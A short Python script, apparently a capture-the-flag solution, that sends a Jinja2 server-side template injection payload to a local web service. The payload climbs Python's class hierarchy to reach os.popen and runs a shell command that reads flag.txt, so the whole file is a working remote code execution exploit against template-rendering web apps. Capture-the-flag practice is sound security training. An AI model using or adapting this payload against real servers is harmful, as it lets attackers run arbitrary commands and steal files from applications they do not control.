import requests
import re

url = 'http://127.0.0.1:1337/?input='

p = """
{% for x in ()["__class__"].__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('base32 flag.txt').read()}}{%endif%}{%endfor%}
"""



r = requests.get(url + p)

print(r.text)